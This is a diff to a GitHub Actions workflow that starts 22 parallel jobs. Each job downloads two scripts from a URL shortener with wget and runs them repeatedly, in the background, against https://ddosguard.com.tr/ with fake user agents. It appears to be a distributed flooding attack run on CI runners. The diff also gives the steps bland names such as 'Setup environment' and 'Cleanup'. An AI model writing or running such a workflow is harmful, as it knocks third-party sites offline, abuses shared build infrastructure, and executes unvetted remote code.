@@ -1,5 +1,4 @@
 name: CRAW !
-
 on:
   workflow_dispatch:
 
@@ -10,31 +9,39 @@ jobs:
       max-parallel: 22
       matrix:
         instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22]
-
-
+    
     steps:
-      - name: OK !
+      - name: Setup environment
         run: |
           pip install playwright fake-useragent
           playwright install
+          
+      - name: Download scripts
+        run: |
           wget https://curl.by/sSwco/Test.py
           wget https://curl.by/DT6Ey/testraw.js
-          chmod +x testraw.js
-          chmod +x Test.py
-          chmod 777 *
-          sudo su
+          chmod +x testraw.js Test.py
+          
+      - name: Run tasks
+        run: |
           PIDS=()
           for i in {1..4}; do
-            timeout 200 python3 Test.py https://ddosguard.com.tr/ && node testraw.js https://ddosguard.com.tr/ 666
+            timeout 200 python3 Test.py https://ddosguard.com.tr/ &
+            PIDS+=($!)
+            timeout 200 node testraw.js https://ddosguard.com.tr/ 666 &
             PIDS+=($!)
           done
           
+          # Wait for all background processes
           for pid in "${PIDS[@]}"; do
-            wait $pid
+            wait $pid || true
           done
-
-      - name: OK !
+          
+      - name: Additional wait
         run: sleep 200
         
-      - name: OK !
-        run: sudo reboot
+      - name: Cleanup
+        if: always()
+        run: |
+          echo "Job completed"
+          # Cleanup operations if needed
